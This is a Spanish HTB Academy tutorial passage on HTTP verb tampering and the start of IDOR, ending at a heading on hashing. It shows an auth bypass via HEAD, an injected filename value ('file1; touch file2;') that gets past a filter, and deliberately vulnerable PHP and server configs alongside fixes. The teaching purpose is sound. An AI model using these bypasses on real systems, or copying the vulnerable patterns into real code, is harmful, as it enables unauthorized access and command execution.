---
tags:
  - HTB-Academy
  - Penetration-Tester
---


# Introducción a los Ataques Web

---

A medida que las aplicaciones web se están volviendo muy comunes y se utilizan para la mayoría de las empresas, la importancia de protegerlas contra ataques maliciosos también se vuelve más crítica. A medida que las aplicaciones web modernas se vuelven más complejas y avanzadas, también lo hacen los tipos de ataques utilizados contra ellas. Esto conduce a una vasta superficie de ataque para la mayoría de las empresas de hoy en día, por lo que los ataques web son los tipos más comunes de ataques contra empresas. La protección de las aplicaciones web se está convirtiendo en una de las principales prioridades para cualquier departamento de TI.

Atacar las aplicaciones web externas puede resultar en un compromiso de la red interna de las empresas, lo que eventualmente puede conducir a activos robados o servicios interrumpidos. Potencialmente puede causar un desastre financiero para la empresa. Incluso si una empresa no tiene aplicaciones web externas, es probable que utilicen aplicaciones web internas o puntos finales API externos, los cuales son vulnerables a los mismos tipos de ataques y pueden aprovecharse para lograr los mismos objetivos.

Mientras que otros módulos de HTB Academy cubrieron varios temas sobre aplicaciones web y varios tipos de técnicas de explotación web, en este módulo, cubriremos otros tres ataques web que se pueden encontrar en cualquier aplicación web, lo que puede llevar a un compromiso. Discutiremos cómo detectar, explotar y prevenir cada uno de estos tres ataques.

---

## Ataques Web

#### HTTP Verb Tampering

El primer ataque web discutido en este módulo es [HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering). Un ataque HTTP Verb Tampering explota servidores web que aceptan muchos verbos y métodos HTTP. Esto puede ser explotado mediante el envío de solicitudes maliciosas utilizando métodos inesperados, lo que puede llevar a eludir el mecanismo de autorización de la aplicación web o incluso eludir sus controles de seguridad contra otros ataques web. Los ataques de manipulación de HTTP Verb son uno de los muchos otros ataques HTTP que se pueden utilizar para explotar las configuraciones del servidor web mediante el envío de solicitudes HTTP maliciosas.

#### Referencias Inseguras de Objetos Directos (IDOR)

El segundo ataque discutido en este módulo es [Referencias Inseguras de Objetos Directos (IDOR)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References). IDOR se encuentra entre las vulnerabilidades web más comunes y puede llevar a acceder a datos que los atacantes no deberían acceder. Lo que hace que este ataque sea muy común es esencialmente la falta de un sistema de control de acceso sólido en el back-end. A medida que las aplicaciones web almacenan los archivos e información de los usuarios, pueden usar números secuenciales o ID de usuario para identificar cada elemento. Supongamos que la aplicación web carece de un mecanismo de control de acceso robusto y expone referencias directas a archivos y recursos. En ese caso, podemos acceder a los archivos e información de otros usuarios simplemente adivinando o calculando sus ID de archivo.

#### Inyección de Entidad Externa XML (XXE)

El tercer y último ataque web que discutiremos es [Inyección de Entidad Externa XML (XXE)](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing). Muchas aplicaciones web procesan datos XML como parte de su funcionalidad. Supongamos que una aplicación web utiliza bibliotecas XML obsoletas para analizar y procesar datos de entrada XML del usuario front-end. En ese caso, puede ser posible enviar datos XML maliciosos para revelar archivos locales almacenados en el servidor de back-end. Estos archivos pueden ser archivos de configuración que pueden contener información confidencial como contraseñas o incluso el código fuente de la aplicación web, lo que nos permitiría realizar una Prueba de Penetración de Whitebox en la aplicación web para identificar más vulnerabilidades. Los ataques XXE pueden incluso aprovecharse para robar las credenciales del servidor de alojamiento, lo que comprometería todo el servidor y permitiría la ejecución remota de código.

Comencemos discutiendo el primero de estos ataques en la siguiente sección.


# Introducción a HTTP Verb Tampering

---

El `HTTP` el protocolo funciona aceptando varios métodos HTTP como `verbs` al comienzo de una solicitud HTTP. Dependiendo de la configuración del servidor web, las aplicaciones web pueden ser escritas para aceptar ciertos métodos HTTP para sus diversas funcionalidades y realizar una acción particular basada en el tipo de solicitud.

Mientras que los programadores consideran principalmente los dos métodos HTTP más utilizados, `GET` y `POST`, cualquier cliente puede enviar cualquier otro método en sus solicitudes HTTP y luego ver cómo el servidor web maneja estos métodos. Supongamos que tanto la aplicación web como el servidor web de back-end están configurados solo para aceptar `GET` y `POST` solicitudes. En ese caso, enviar una solicitud diferente hará que se muestre una página de error del servidor web, lo que no es una vulnerabilidad grave en sí misma (aparte de proporcionar una mala experiencia de usuario y potencialmente conducir a la divulgación de información). Por otro lado, si las configuraciones del servidor web no están restringidas a aceptar solo los métodos HTTP requeridos por el servidor web (por ejemplo. `GET`/`POST`), y la aplicación web no está desarrollada para manejar otros tipos de solicitudes HTTP (por ejemplo. `HEAD`, `PUT`), entonces podemos explotar esta configuración insegura para obtener acceso a funcionalidades a las que no tenemos acceso, o incluso eludir ciertos controles de seguridad.

---

## HTTP Verb Tampering

Para entender `HTTP Verb Tampering`, primero debemos aprender sobre los diferentes métodos aceptados por el protocolo HTTP. HTTP tiene [9 verbos diferentes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) eso puede ser aceptado como métodos HTTP por los servidores web. Aparte de `GET` y `POST`, los siguientes son algunos de los verbos HTTP comúnmente utilizados:

|Verbo|Descripción|
|---|---|
|`HEAD`|Idéntico a una solicitud GET, pero su respuesta solo contiene el `headers`, sin el cuerpo de respuesta|
|`PUT`|Escribe la carga útil de solicitud en la ubicación especificada|
|`DELETE`|Elimina el recurso en la ubicación especificada|
|`OPTIONS`|Muestra diferentes opciones aceptadas por un servidor web, como los verbos HTTP aceptados|
|`PATCH`|Aplique modificaciones parciales al recurso en la ubicación especificada|

Como puede imaginar, algunos de los métodos anteriores pueden realizar funcionalidades muy sensibles, como escribir (`PUT`) o eliminar (`DELETE`) archivos al directorio webroot en el servidor de back-end. Como se discutió en el [Solicitudes Web](https://academy.hackthebox.com/course/preview/web-requests) módulo, si un servidor web no está configurado de forma segura para administrar estos métodos, podemos usarlos para obtener control sobre el servidor de back-end. Sin embargo, lo que hace que los ataques HTTP Verb Tampering sean más comunes (y, por lo tanto, más críticos), es que son causados por una configuración incorrecta en el servidor web de back-end o en la aplicación web, cualquiera de los cuales puede causar la vulnerabilidad.

---

## Configuraciones Inseguras

Las configuraciones inseguras del servidor web causan el primer tipo de vulnerabilidades de manipulación de HTTP Verb. La configuración de autenticación de un servidor web puede limitarse a métodos HTTP específicos, lo que dejaría algunos métodos HTTP accesibles sin autenticación. Por ejemplo, un administrador del sistema puede usar la siguiente configuración para requerir autenticación en una página web en particular:

Código: xml

```xml
<Limit GET POST>
    Require valid-user
</Limit>
```

Como podemos ver, a pesar de que la configuración especifica ambos `GET` y `POST` solicitudes para el método de autenticación, un atacante puede seguir utilizando un método HTTP diferente (como `HEAD`) para omitir este mecanismo de autenticación por completo, como veremos en la siguiente sección. Esto eventualmente conduce a un bypass de autenticación y permite a los atacantes acceder a páginas web y dominios a los que no deberían tener acceso.

---

## Codificación Insegura

Las prácticas de codificación inseguras causan el otro tipo de vulnerabilidades de manipulación de Verbos HTTP (aunque algunos pueden no considerar esta manipulación de Verbos). Esto puede ocurrir cuando un desarrollador web aplica filtros específicos para mitigar vulnerabilidades particulares sin cubrir todos los métodos HTTP con ese filtro. Por ejemplo, si se encontró que una página web era vulnerable a una vulnerabilidad de inyección SQL, y el desarrollador de back-end mitigó la vulnerabilidad de inyección SQL aplicando los siguientes filtros de desinfección de entrada:

Código: php

```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```

Podemos ver que el filtro de desinfección solo se está probando en el `GET` parámetro. Si las solicitudes GET no contienen caracteres incorrectos, se ejecutará la consulta. Sin embargo, cuando se ejecuta la consulta, el `$_REQUEST["code"]` se están utilizando parámetros, que también pueden contener `POST` parámetros, `leading to an inconsistency in the use of HTTP Verbs`. En este caso, un atacante puede usar un `POST` solicitar realizar inyección SQL, en cuyo caso el `GET` los parámetros estarían vacíos (no incluirán caracteres malos). La solicitud pasaría el filtro de seguridad, lo que haría que la función aún fuera vulnerable a la inyección SQL.

Si bien ambas vulnerabilidades anteriores se encuentran en público, la segunda es mucho más común, ya que se debe a errores cometidos en la codificación, mientras que la primera generalmente se evita mediante configuraciones seguras de servidores web, ya que la documentación a menudo advierte en su contra. En las próximas secciones, veremos ejemplos de ambos tipos y cómo explotarlos.


# Evitando la Autenticación Básica

---

Explotar las vulnerabilidades de manipulación de HTTP Verb suele ser un proceso relativamente sencillo. Solo necesitamos probar métodos HTTP alternativos para ver cómo son manejados por el servidor web y la aplicación web. Si bien muchas herramientas automatizadas de escaneo de vulnerabilidades pueden identificar constantemente las vulnerabilidades de manipulación de HTTP Verb causadas por configuraciones de servidor inseguras, generalmente omiten identificar las vulnerabilidades de manipulación de HTTP causadas por la codificación insegura. Esto se debe a que el primer tipo se puede identificar fácilmente una vez que omitimos una página de autenticación, mientras que el otro necesita pruebas activas para ver si podemos omitir los filtros de seguridad en su lugar.

El primer tipo de vulnerabilidad HTTP Verb Tampering es causada principalmente por `Insecure Web Server Configurations`y explotar esta vulnerabilidad puede permitirnos omitir el mensaje de autenticación básica HTTP en ciertas páginas.

---

## Identificar

Cuando comenzamos el ejercicio al final de esta sección, vemos que tenemos un básico `File Manager` aplicación web, en la que podemos añadir nuevos archivos escribiendo sus nombres y golpeando `enter`:

   

![Interfaz de administrador de archivos con entrada para el nuevo nombre de archivo y enlaces a 'test' y 'notes.txt'.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_add.jpg)

Sin embargo, supongamos que intentamos eliminar todos los archivos haciendo clic en el rojo `Reset` botón. En ese caso, vemos que esta funcionalidad parece estar restringida solo para usuarios autenticados, ya que obtenemos lo siguiente `HTTP Basic Auth` aviso:

   

![Formulario de inicio de sesión con campos para nombre de usuario y contraseña, y una advertencia sobre una conexión insegura.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_reset.jpg)

Como no tenemos ninguna credencial, obtendremos un `401 Unauthorized` página:

   

![Mensaje de error de acceso no autorizado que indica credenciales incorrectas o problema del navegador.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_unauthorized.jpg)

Entonces, veamos si podemos evitar esto con un ataque HTTP Verb Tampering. Para hacerlo, necesitamos identificar qué páginas están restringidas por esta autenticación. Si examinamos la solicitud HTTP después de hacer clic en el botón Restablecer o miramos la URL a la que navega el botón después de hacer clic en él, vemos que está en `/admin/reset.php`. Entonces, o el `/admin` el directorio está restringido solo a usuarios autenticados, o solo a `/admin/reset.php` la página es. Podemos confirmar esto visitando el `/admin` directorio, y de hecho se nos pide que inicie sesión de nuevo. Esto significa que el completo `/admin` el directorio está restringido.

---

## Explotar

Para intentar explotar la página, necesitamos identificar el método de solicitud HTTP utilizado por la aplicación web. Podemos interceptar la solicitud en Burp Suite y examinarla: ![Solicitud HTTP GET a /admin/reset.php con encabezados y detalles del agente de usuario.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_unauthorized_request.jpg)

Como la página usa a `GET` solicitud, podemos enviar un `POST` solicite y vea si la página web lo permite `POST` solicitudes (es decir, si la autenticación cubre `POST` solicitudes). Para hacerlo, podemos hacer clic derecho en la solicitud interceptada en Burp y seleccionar `Change Request Method`, y cambiará automáticamente la solicitud en un `POST` solicitud: ![Solicitud HTTP GET a /admin/reset.php con encabezados y detalles del agente de usuario, que muestra las opciones para cambiar el método de solicitud.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_change_request.jpg)

Una vez que lo hagamos, podemos hacer clic `Forward` y examine la página en nuestro navegador. Desafortunadamente, aún se nos pide que iniciemos sesión y obtendremos un `401 Unauthorized` página si no proporcionamos las credenciales:

   

![Formulario de inicio de sesión con campos para nombre de usuario y contraseña, y una advertencia sobre una conexión insegura.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_reset.jpg)

Por lo tanto, parece que las configuraciones del servidor web cubren ambos `GET` y `POST` solicitudes. Sin embargo, como hemos aprendido anteriormente, podemos utilizar muchos otros métodos HTTP, especialmente el `HEAD` método, que es idéntico a un `GET` solicitar pero no devuelve el cuerpo en la respuesta HTTP. Si esto tiene éxito, es posible que no recibamos ninguna salida, sino el `reset` la función aún debe ejecutarse, que es nuestro objetivo principal.

Para ver si el servidor acepta `HEAD` solicitudes, podemos enviar un `OPTIONS` solicite y vea qué métodos HTTP se aceptan, de la siguiente manera:

  Evitando la Autenticación Básica

```shell-session
vcrdcr@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory
```

Como podemos ver, la respuesta muestra `Allow: POST,OPTIONS,HEAD,GET`, lo que significa que el servidor web realmente acepta `HEAD` solicitudes, que es la configuración predeterminada para muchos servidores web. Entonces, intentemos interceptar el `reset` solicite de nuevo, y esta vez use un `HEAD` solicite ver cómo lo maneja el servidor web:

![Solicitud HTTP HEAD a /admin/reset.php con encabezados y detalles del agente de usuario.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_HEAD_request.jpg)

Una vez que cambiemos `POST` a `HEAD` y reenvíe la solicitud, veremos que ya no obtenemos un mensaje de inicio de sesión o un mensaje `401 Unauthorized` página y obtener una salida vacía en su lugar, como se esperaba con un `HEAD` solicitar. Si volvemos al `File Manager` aplicación web, veremos que todos los archivos se han eliminado, lo que significa que activamos con éxito el `Reset` funcionalidad sin tener acceso de administrador o credenciales:

   

![Interfaz de administrador de archivos con entrada para el nuevo nombre de archivo y botón de reinicio.](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_after_reset.jpg)

Intente probar otros métodos HTTP y vea cuáles pueden omitir con éxito el mensaje de autenticación.



# Bypass Filtros de Seguridad

---

El otro tipo más común de vulnerabilidad de manipulación de HTTP Verb es causado por `Insecure Coding` errores cometidos durante el desarrollo de la aplicación web, lo que lleva a que la aplicación web no cubra todos los métodos HTTP en ciertas funcionalidades. Esto se encuentra comúnmente en los filtros de seguridad que detectan solicitudes maliciosas. Por ejemplo, si se estaba utilizando un filtro de seguridad para detectar vulnerabilidades de inyección y solo se verificaba la inyección `POST` parámetros (p. ej. `$_POST['parameter']`), puede ser posible omitirlo simplemente cambiando el método de solicitud a `GET`.

---

## Identificar

En el `File Manager` aplicación web, si intentamos crear un nuevo nombre de archivo con caracteres especiales en su nombre (por ejemplo. `test;`), recibimos el siguiente mensaje:

   

![Interfaz de Administrador de archivos con una entrada de texto para 'Nuevo Nombre de archivo', un botón 'Restablecer' y un enlace a 'notes.txt'. Mensaje: 'Malicious Request Denied!'](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_malicious_request.jpg)

Este mensaje muestra que la aplicación web utiliza ciertos filtros en el back-end para identificar los intentos de inyección y luego bloquea cualquier solicitud maliciosa. No importa lo que intentemos, la aplicación web bloquea correctamente nuestras solicitudes y está protegida contra intentos de inyección. Sin embargo, podemos probar un ataque de manipulación de verbos HTTP para ver si podemos omitir el filtro de seguridad por completo.

---

## Explotar

Para intentar explotar esta vulnerabilidad, interceptemos la solicitud en Burp Suite (Burp) y luego utilicemos `Change Request Method` para cambiarlo a otro método: ![Solicitud HTTP GET a 138.68.140.119:31378 con parámetro de nombre de archivo 'test%3B' y encabezados que incluyen Host, Cache-Control, User-Agent y Connection](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_GET_request.jpg)

Esta vez, no obtuvimos el `Malicious Request Denied!` mensaje, y nuestro archivo fue creado con éxito:

   

![Administrador de archivos con entrada para 'Nuevo Nombre de Archivo', botón 'Restablecer' y enlaces a 'notes.txt' y 'test'](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_injected_request.jpg)

Para confirmar si omitimos el filtro de seguridad, debemos intentar explotar la vulnerabilidad que protege el filtro: una vulnerabilidad de Inyección de comandos, en este caso. Por lo tanto, podemos inyectar un comando que crea dos archivos y luego verificar si ambos archivos se crearon. Para hacerlo, utilizaremos el siguiente nombre de archivo en nuestro ataque (`file1; touch file2;`):

   

![Administrador de archivos con entrada 'file1; touch file2;', botón 'Restablecer' y enlaces a 'notes.txt' y 'test'](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_filter_bypass.jpg)

Entonces, podemos cambiar una vez más el método de solicitud a un `GET` solicitud: ![Solicitud HTTP GET a 138.68.140.119:31378 con el parámetro de nombre de archivo 'file1%3B+touch+file2%3B' y encabezados que incluyen Host, Cache-Control, User-Agent y Connection](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_filter_bypass_request.jpg)

Una vez que enviamos nuestra solicitud, vemos que esta vez ambos `file1` y `file2` fueron creados:

   

![Administrador de archivos con entrada para 'Nuevo Nombre de Archivo', botón 'Restablecer' y enlaces a 'file2', 'notes.txt', 'test' y 'file1'](https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_after_filter_bypass.jpg)

Esto muestra que omitimos con éxito el filtro a través de una vulnerabilidad HTTP Verb Tampering y logramos la inyección de comandos. Sin la vulnerabilidad HTTP Verb Tampering, la aplicación web puede haber sido segura contra los ataques de Inyección de comandos, y esta vulnerabilidad nos permitió evitar los filtros en su lugar por completo.


# Prevención de la Tamperización de Verbos

---

Después de ver algunas formas de explotar las vulnerabilidades de Verb Tampering, veamos cómo podemos protegernos contra este tipo de ataques evitando Verb Tampering. Las configuraciones inseguras y la codificación insegura son lo que generalmente introduce vulnerabilidades de Verb Tampering. En esta sección, veremos muestras de código y configuraciones vulnerables y discutiremos cómo podemos parchearlos.

---

## Configuración Insegura

Las vulnerabilidades de manipulación de HTTP Verb pueden ocurrir en la mayoría de los servidores web modernos, incluyendo `Apache`, `Tomcat`, y `ASP.NET`. La vulnerabilidad generalmente ocurre cuando limitamos la autorización de una página a un conjunto particular de verbos/métodos HTTP, lo que deja a los otros métodos restantes desprotegidos.

El siguiente es un ejemplo de una configuración vulnerable para un servidor web Apache, que se encuentra en el archivo de configuración del sitio (por ejemplo. `000-default.conf`), o en un `.htaccess` archivo de configuración de página web:

Código: xml

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

Como podemos ver, esta configuración está configurando las configuraciones de autorización para el `admin` directorio web. Sin embargo, como el `<Limit GET>` se está utilizando la palabra clave, el `Require valid-user` la configuración solo se aplicará a `GET` solicitudes, dejando la página accesible a través de `POST` solicitudes. Incluso si ambos `GET` y `POST` se especificaron, esto dejaría la página accesible a través de otros métodos, como `HEAD` o `OPTIONS`.

El siguiente ejemplo muestra la misma vulnerabilidad para un `Tomcat` configuración del servidor web, que se puede encontrar en el `web.xml` archivo para una determinada aplicación web Java:

Código: xml

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

Podemos ver que la autorización se limita solo a la `GET` método con `http-method`, lo que deja la página accesible a través de otros métodos HTTP.

Finalmente, el siguiente es un ejemplo para un `ASP.NET` configuración encontrada en el `web.config` archivo de una aplicación web:

Código: xml

```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

Una vez más, el `allow` y `deny` el alcance se limita a la `GET` método, que deja la aplicación web accesible a través de otros métodos HTTP.

Los ejemplos anteriores muestran que no es seguro limitar la configuración de autorización a un verbo HTTP específico. Es por eso que siempre debemos evitar restringir la autorización a un método HTTP en particular y siempre permitir/negar todos los verbos y métodos HTTP.

Si queremos especificar un solo método, podemos usar palabras clave seguras, como `LimitExcept` en Apache, `http-method-omission` en Tomcat, y `add`/`remove` en ASP.NET, que cubre todos los verbos excepto los especificados.

Finalmente, para evitar ataques similares, generalmente deberíamos `consider disabling/denying all HEAD requests` a menos que la aplicación web lo requiera específicamente.

---

## Codificación Insegura

Si bien identificar y parchear configuraciones inseguras de servidores web es relativamente fácil, hacer lo mismo con el código inseguro es mucho más desafiante. Esto se debe a que para identificar esta vulnerabilidad en el código, necesitamos encontrar inconsistencias en el uso de parámetros HTTP en todas las funciones, ya que en algunos casos, esto puede conducir a funcionalidades y filtros desprotegidos.

Consideremos lo siguiente `PHP` código de nuestro `File Manager` ejercicio:

Código: php

```php
if (isset($_REQUEST['filename'])) {
    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
        system("touch " . $_REQUEST['filename']);
    } else {
        echo "Malicious Request Denied!";
    }
}
```

Si solo estuviéramos considerando las vulnerabilidades de Inyección de comandos, diríamos que esto está codificado de forma segura. El `preg_match` la función busca correctamente caracteres especiales no deseados y no permite que la entrada entre en el comando si se encuentran caracteres especiales. Sin embargo, el error fatal cometido en este caso no se debe a Inyecciones de Comando, sino a la `inconsistent use of HTTP methods`.

Vemos que el `preg_match` el filtro solo comprueba los caracteres especiales en `POST` parámetros con `$_POST['filename']`. Sin embargo, la final `system` el comando usa el `$_REQUEST['filename']` variable, que cubre ambos `GET` y `POST` parámetros. Entonces, en la sección anterior, cuando estábamos enviando nuestra entrada maliciosa a través de un `GET` solicitud, no fue detenido por el `preg_match` función, como el `POST` los parámetros estaban vacíos y, por lo tanto, no contenían caracteres especiales. Una vez que lleguemos al `system` función, sin embargo, utilizó cualquier parámetro encontrado en la solicitud, y nuestro `GET` los parámetros se usaron en el comando, lo que finalmente condujo a la Inyección de Comando.

Este ejemplo básico nos muestra cómo las inconsistencias menores en el uso de métodos HTTP pueden conducir a vulnerabilidades críticas. En una aplicación web de producción, este tipo de vulnerabilidades no serán tan obvias. Probablemente se extenderían por toda la aplicación web y no estarán en dos líneas consecutivas como las que tenemos aquí. En cambio, la aplicación web probablemente tendrá una función especial para verificar si hay inyecciones y una función diferente para crear archivos. Esta separación de código dificulta la captura de este tipo de inconsistencias y, por lo tanto, pueden sobrevivir a la producción.

Para evitar vulnerabilidades HTTP Verb Tampering en nuestro código `we must be consistent with our use of HTTP methods` y asegúrese de que el mismo método siempre se use para cualquier funcionalidad específica en toda la aplicación web. Siempre se recomienda `expand the scope of testing in security filters` probando todos los parámetros de solicitud. Esto se puede hacer con las siguientes funciones y variables:

|Idioma|Función|
|---|---|
|PHP|`$_REQUEST['param']`|
|Java|`request.getParameter('param')`|
|C#|`Request['param']`|

Si nuestro alcance en las funciones relacionadas con la seguridad cubre todos los métodos, debemos evitar tales vulnerabilidades o omisiones de filtros.


# Introducción a IDOR

---

`Insecure Direct Object References (IDOR)`las vulnerabilidades se encuentran entre las vulnerabilidades web más comunes y pueden afectar significativamente la aplicación web vulnerable. Las vulnerabilidades de IDOR ocurren cuando una aplicación web expone una referencia directa a un objeto, como un archivo o un recurso de base de datos, que el usuario final puede controlar directamente para obtener acceso a otros objetos similares. Si cualquier usuario puede acceder a cualquier recurso debido a la falta de un sistema de control de acceso sólido, el sistema se considera vulnerable.

Construir un sistema de control de acceso sólido es muy desafiante, por lo que las vulnerabilidades de IDOR son generalizadas. Además, automatizar el proceso de identificación de debilidades en los sistemas de control de acceso también es bastante difícil, lo que puede llevar a que estas vulnerabilidades no se identifiquen hasta que lleguen a la producción.

Por ejemplo, si los usuarios solicitan acceso a un archivo que cargaron recientemente, pueden obtener un enlace a él, como (`download.php?file_id=123`). Entonces, como el enlace hace referencia directamente al archivo con (`file_id=123`), ¿qué pasaría si intentáramos acceder a otro archivo (que puede no pertenecernos) con (`download.php?file_id=124`¿)? Si la aplicación web no tiene un sistema de control de acceso adecuado en el back-end, es posible que podamos acceder a cualquier archivo enviando una solicitud con su `file_id`. En muchos casos, podemos encontrar que el `id` es fácilmente adivinable, lo que permite recuperar muchos archivos o recursos a los que no deberíamos tener acceso en función de nuestros permisos.

---

## Qué Hace una Vulnerabilidad IDOR

Simplemente exponer una referencia directa a un objeto o recurso interno no es una vulnerabilidad en sí misma. Sin embargo, esto puede hacer posible explotar otra vulnerabilidad: a `weak access control system`. Muchas aplicaciones web restringen a los usuarios el acceso a los recursos al restringirles el acceso a las páginas, funciones y API que pueden recuperar estos recursos. Sin embargo, ¿qué pasaría si un usuario de alguna manera tuviera acceso a estas páginas (por ejemplo, a través de un enlace compartido/adivinado)? ¿Seguirían pudiendo acceder a los mismos recursos simplemente teniendo el enlace para acceder a ellos? Si la aplicación web no tenía un sistema de control de acceso en el back-end que compara la autenticación del usuario con la lista de acceso del recurso, podría ser capaz de hacerlo.

Hay muchas maneras de implementar un sistema de control de acceso sólido para aplicaciones web, como tener un Control de Acceso Basado en Rol ([RBAC](https://en.wikipedia.org/wiki/Role-based_access_control)) sistema. La principal conclusión es que `an IDOR vulnerability mainly exists due to the lack of an access control on the back-end`. Si un usuario tuviera referencias directas a objetos en una aplicación web que carece de control de acceso, sería posible para los atacantes ver o modificar los datos de otros usuarios.

Muchos desarrolladores ignoran la construcción de un sistema de control de acceso; por lo tanto, la mayoría de las aplicaciones web y aplicaciones móviles se quedan desprotegidas en el back-end. En tales aplicaciones, todos los usuarios pueden tener acceso arbitrario a todos los datos de otros usuarios en el back-end. Lo único que impide que los usuarios accedan a los datos de otros usuarios sería la implementación front-end de la aplicación, que está diseñada para mostrar solo los datos del usuario. En tales casos, la manipulación manual de las solicitudes HTTP puede revelar que todos los usuarios tienen acceso completo a todos los datos, lo que lleva a un ataque exitoso.

Todo esto convierte a las vulnerabilidades IDOR en una de las vulnerabilidades más críticas para cualquier aplicación web o móvil, no solo por exponer referencias directas de objetos, sino principalmente por la falta de un sistema de control de acceso sólido. Incluso un sistema básico de control de acceso puede ser difícil de desarrollar. Un sistema de control de acceso integral que cubra toda la aplicación web sin interferir con sus funciones podría ser una tarea aún más difícil. Esta es la razón por la cual las vulnerabilidades de IDOR/Access Control se encuentran incluso en aplicaciones web muy grandes, como [Facebook](https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486), [Instagram](https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a), y [Twitter](https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3).

---

## Impacto de las vulnerabilidades de IDOR

Como se mencionó anteriormente, las vulnerabilidades de IDOR pueden tener un impacto significativo en las aplicaciones web. El ejemplo más básico de una vulnerabilidad IDOR es acceder a archivos privados y recursos de otros usuarios que no deberían ser accesibles para nosotros, como archivos personales o datos de tarjetas de crédito, lo que se conoce como `IDOR Information Disclosure Vulnerabilities`. Dependiendo de la naturaleza de la referencia directa expuesta, la vulnerabilidad puede incluso permitir la modificación o eliminación de los datos de otros usuarios, lo que puede conducir a una adquisición de cuenta completa.

Una vez que un atacante identifica las referencias directas, que pueden ser ID de base de datos o parámetros de URL, puede comenzar a probar patrones específicos para ver si puede obtener acceso a cualquier dato y eventualmente puede entender cómo extraer o modificar datos para cualquier usuario arbitrario.

Las vulnerabilidades IDOR también pueden conducir a la elevación de los privilegios de usuario de un usuario estándar a un usuario administrador, con `IDOR Insecure Function Calls`. Por ejemplo, muchas aplicaciones web exponen parámetros de URL o API para funciones de solo administración en el código front-end de la aplicación web y deshabilitan estas funciones para usuarios que no son administradores. Sin embargo, si tuviéramos acceso a dichos parámetros o API, podemos llamarlos con nuestros privilegios de usuario estándar. Supongamos que el back-end no negó explícitamente a los usuarios que no son administradores llamar a estas funciones. En ese caso, es posible que podamos realizar operaciones administrativas no autorizadas, como cambiar las contraseñas de los usuarios o otorgar a los usuarios ciertos roles, lo que eventualmente puede llevar a una adquisición total de toda la aplicación web.

# Identificación de IDOR

---

## parámetros de URL y API

---

El primer paso para explotar las vulnerabilidades de IDOR es identificar Referencias Directas de Objetos. Cada vez que recibimos un archivo o recurso específico, debemos estudiar las solicitudes HTTP para buscar parámetros de URL o API con una referencia de objeto (por ejemplo. `?uid=1` o `?filename=file_1.pdf`). Estos se encuentran principalmente en parámetros de URL o API, pero también se pueden encontrar en otros encabezados HTTP, como las cookies.

En los casos más básicos, podemos intentar incrementar los valores de las referencias de objetos para recuperar otros datos, como (`?uid=2`) o (`?filename=file_2.pdf`). También podemos usar una aplicación fuzzing para probar miles de variaciones y ver si devuelven algún dato. Cualquier éxito en los archivos que no son nuestros indicaría una vulnerabilidad IDOR.

---

## AJAX Llama

También podemos identificar parámetros o API no utilizados en el código front-end en forma de llamadas JavaScript AJAX. Algunas aplicaciones web desarrolladas en marcos JavaScript pueden colocar inseguramente todas las llamadas a funciones en el front-end y usar las apropiadas según el rol del usuario.

Por ejemplo, si no tuviéramos una cuenta de administrador, solo se usarían las funciones de nivel de usuario, mientras que las funciones de administración estarían deshabilitadas. Sin embargo, es posible que aún podamos encontrar las funciones de administración si analizamos el código JavaScript de front-end y podemos identificar llamadas AJAX a puntos finales o API específicos que contienen referencias directas de objetos. Si identificamos referencias directas de objetos en el código JavaScript, podemos probarlas para detectar vulnerabilidades IDOR.

Esto no es exclusivo de las funciones de administración, por supuesto, pero también puede ser cualquier función o llamada que no se encuentre a través del monitoreo de solicitudes HTTP. El siguiente ejemplo muestra un ejemplo básico de una llamada AJAX:

Código: javascript

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

Es posible que nunca se llame a la función anterior cuando usamos la aplicación web como un usuario no administrador. Sin embargo, si lo ubicamos en el código front-end, podemos probarlo de diferentes maneras para ver si podemos llamarlo para realizar cambios, lo que indicaría que es vulnerable a IDOR. Podemos hacer lo mismo con el código de back-end si tenemos acceso a él (por ejemplo, aplicaciones web de código abierto).

---

## Comprender el Hashing/Encoding

